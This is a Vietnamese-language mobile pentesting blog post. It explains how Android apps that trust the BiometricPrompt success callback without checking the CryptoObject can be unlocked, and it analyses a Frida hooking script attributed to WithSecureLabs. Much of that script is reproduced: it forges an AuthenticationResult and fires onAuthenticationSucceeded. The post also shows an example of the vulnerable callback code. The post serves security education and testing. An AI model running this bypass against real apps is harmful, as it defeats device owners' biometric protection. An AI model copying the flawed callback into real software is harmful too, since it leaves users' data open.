---
title: "FINGERPRINT BYPASS"
layout: posts
last_modified_at: 29-12-2023T16:08:30
categories:
  - Blog
tags:
  - Security Mobile
  - Hacking Mobile
  - Pentest Mobile
---

**Date created: Fri, 29-12-2023 08:30**

## Mở đầu

Biometric authentication được thực hiện bằng cách sử dụng class `FingerprintManager` hoặc `BiometricPrompt` để quản lý cơ chế authentication và hộp thoại thông báo của ứng dụng yêu cầu người dùng authenticate.
Class `FingerprintManager` được giới thiệu trong API 23 chỉ hỗ trợ xác thực dấu vân tay và không dùng nữa kể từ API 28. Thay vào đó `BiometricPrompt` được phát hành và cách sử dụng cũng khá tương đồng với `FingerprintManager`.

## Biometric/Fingerprint authentication

Theo như tài liệu của Android, class `BiometricPrompt` có một phương thức rất quan trọng đó là `authenticate`.

```java
public void authenticate (BiometricPrompt.CryptoObject crypto, CancellationSignal cancel, Executor executor, BiometricPrompt.AuthenticationCallback callback)
```

Phương thức này sẽ khởi động phần cứng biometric, hiển thị hộp thoại do hệ thống cung cấp yêu cầu sinh trắc học của người dùng và bắt đầu quét để xác thực sinh trắc học. Phương thức này bao gồm các đối số(arguments) lần lượt là:

- [ **`crypto`**](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.CryptoObject): Đối tượng này chứa tham chiếu tới entry trong keystore cần được mở khoá. Để triển khai xác thực sinh trắc học một cách an toàn, keystore key bên trong đối tượng **`crypto`** phải được sử dụng cho một số các hoạt động cryptographic quan trọng của ứng dụng.
- [**`cancel`**](https://developer.android.com/reference/android/os/CancellationSignal): Đối tượng này dùng để huỷ việc xác thực.
- [**`executor`**](https://developer.android.com/reference/java/util/concurrent/Executor): Executor này sẽ chịu trách nhiệm xử lý các sự kiện của callback.
- [**`callback`**](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.AuthenticationCallback): Đối tượng này là một `structure with callbacks` sẽ nhận các sự kiện xác thực được dispatch thông qua Executor.
  Trong đó hai đối số quan trọng mà cần chú ý dó là **`crypto`** và **`callback`** vì nó chịu trách nhiệm liên quan tới vấn đề xác thực của phương thức này.
  Tham số `BiometricPrompt.AuthenticationCallback` được sử dụng như một callback structure thực hiện các phương thức như là:
- [onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result)](<https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.AuthenticationCallback.html#onAuthenticationSucceeded(android.hardware.biometrics.BiometricPrompt.AuthenticationResult)>)
- [onAuthenticationError](<https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.AuthenticationCallback.html#onAuthenticationError(int,%20java.lang.CharSequence)>)()
- [onAuthenticationFailed](<https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt.AuthenticationCallback.html#onAuthenticationFailed()>)()
  Trong đó phương thức `onAuthenticationSucceeded` sẽ kích hoạt khi người dùng được hệ thống xác thực thành công. Phương thức mở khoá ứng dụng thường có sẵn bên trong cái phương thức `callback` này.
  Ý tưởng khai thác cho vấn đề này là thực hiện hooking vào process của ứng dụng và thực hiện gọi trực tiếp phương thức **`onAuthenticationSucceded`** từ đó ứng dụng sẽ được mở khoá ngay lập tức mà không cần cung cấp sinh trắc học hợp lệ.
  Việc triển khai của phương thức **`onAuthenticationSucceded`** có lỗ hổng thường sẽ tương tự như đoạn code sau:

```java
public void onAuthenticationSucceeded(FingerprintManager.AuthenticationResult result) {
// Hiển thị thông báo truy cập thành công
Toast.makeText(getActivity(), "Access granted",Toast.LENGTH_LONG).show();
// Phương thức truy cập có sẵn bên trong phương thức được gọi
accessGranted();
}
```

Ta có thể thấy một điều rằng đoạn code ở trên không hề sử dụng bất kỳ đối tượng `CryptoObject` nào được truyền vào `AuthenticationResult` thay vào đó chỉ giả xử rằng quá trình xác thực đã thành công vì phương thức `onAuthenticationSucceded` được gọi.

## Phân tích script dùng để bypass fingerprint-bypass của [WithSecureLabs](https://github.com/WithSecureLabs)

Như đã mô tả ở trên, hướng tiếp cận của script là thực hiện hook vào callback method `onAuthenticationSucceded` để bypass qua việc xác thực sinh trắc học dựa vào cơ chế cho phép truy cập mà không cần xem xét tới đối tượng `cryptoObject`.

```javascript
function getAuthResult(resultObj, cryptoInst) {
  try {
    var authenticationResultInst = resultObj.$new(cryptoInst, null, 0, false);
  } catch (error) {
    try {
      var authenticationResultInst = resultObj.$new(cryptoInst, null, 0);
    } catch (error) {
      try {
        var authenticationResultInst = resultObj.$new(cryptoInst, null);
      } catch (error) {
        try {
          var authenticationResultInst = resultObj.$new(cryptoInst, 0);
        } catch (error) {
          var authenticationResultInst = resultObj.$new(cryptoInst);
        }
      }
    }
  }
  console.log(
    "cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className
  );
  return authenticationResultInst;
}
```

Script trước tiên sẽ định nghĩa ra hàm `getAuthResult` nhận vào hai tham số (`resultObj` và `cryptoInst`). Hàm này sẽ cố gắng tạo ra một thể hiện(instance) `AuthenticationResult` của class `android.hardware.biometrics.BiometricPrompt$AuthenticationResult` bằng cách thử kết hợp nhiều đối số của phương thức khởi tạo hàm(constructor). Mục đích là để xử lý các constructor signatures khác nhau có thể có trong các phiên bản hoặc các triển khai(implementations) Android khác nhau.

```javascript
function getBiometricPromptAuthResult() {
  var sweet_cipher = null;
  var cryptoObj = Java.use(
    "android.hardware.biometrics.BiometricPrompt$CryptoObject"
  );
  var cryptoInst = cryptoObj.$new(sweet_cipher);
  var authenticationResultObj = Java.use(
    "android.hardware.biometrics.BiometricPrompt$AuthenticationResult"
  );
  var authenticationResultInst = getAuthResult(
    authenticationResultObj,
    cryptoInst
  );
  return authenticationResultInst;
}
```

Tiếp theo, script định nghĩa một hàm tên là `getBiometricPromptAuthResult`, để tạo ra một thể hiện của `BiometricPrompt$AuthenticationResult`. Đồng thời cũng tạo ra một thể hiện mới của `BiometricPrompt$CryptoObject` với giá trị `Cipher` bằng `null`. Sau đó gọi hàm `getAuthResult` truyền vào hai tham số là `authenticationResultObj` và `cryptoInst` mới được tạo trước đó để lấy được giá trị cuối cùng của thể hiện(instance) `AuthenticationResult`.

```javascript
function hookBiometricPrompt_authenticate() {
  var biometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt")[
    "authenticate"
  ].overload(
    "android.os.CancellationSignal",
    "java.util.concurrent.Executor",
    "android.hardware.biometrics.BiometricPrompt$AuthenticationCallback"
  );

  console.log("Hooking BiometricPrompt.authenticate()...");

  biometricPrompt.implementation = function (
    cancellationSignal,
    executor,
    callback
  ) {
    console.log(
      "[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " +
        cancellationSignal +
        ", executor: " +
        ", callback: " +
        callback
    );

    var authenticationResultInst = getBiometricPromptAuthResult();

    callback.onAuthenticationSucceeded(authenticationResultInst);
  };
}
```

Hàm `hookBiometricPrompt_authenticate`, được định nghĩa để thực hiện hook vào phương thức `authenticate` của class `android.hardware.biometrics.BiometricPrompt` có đối số lần lượt là ==('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')==. Tiếp đó thực hiện in ra các tham số của hàm `biometricPrompt.authenticate` đó và gọi hàm `getBiometricPromptAuthResult` đã được định nghĩa ở trên, lưu vào biến `authenticationResultInst`. Cuối cùng là gọi phương thức callback `onAuthenticationSucceeded` và truyền vào biến `authenticationResultInst`.

```
function hookBiometricPrompt_authenticate2() {

    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');

    console.log("Hooking BiometricPrompt.authenticate2()...");

    biometricPrompt.implementation = function (crypto, cancellationSignal, executor, callback) {

        console.log("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto + ", cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);

        var authenticationResultInst = getBiometricPromptAuthResult();

        callback.onAuthenticationSucceeded(authenticationResultInst);

    }

}
```

Hàm `hookBiometricPrompt_authenticate2`, cũng tương tự nhưng đối số sẽ bao gồm thêm ==('android.hardware.biometrics.BiometricPrompt$CryptoObject')==. Đối tượng này như đã được trình bày ở trên sẽ chịu trách nhiệm về các vấn đề liên quan đến việc tham chiếu tới keystore entry của ứng dụng.

## Tổng kết

Bên trên là bài báo cáo chi tiết về nguyên do dẫn đến lỗi `Biometric authentication` này cũng như luồng thực thi của script frida fingerprint bypass của WithSecureLabs.

---

References:

- https://labs.withsecure.com/publications/how-secure-is-your-android-keystore-authentication

---
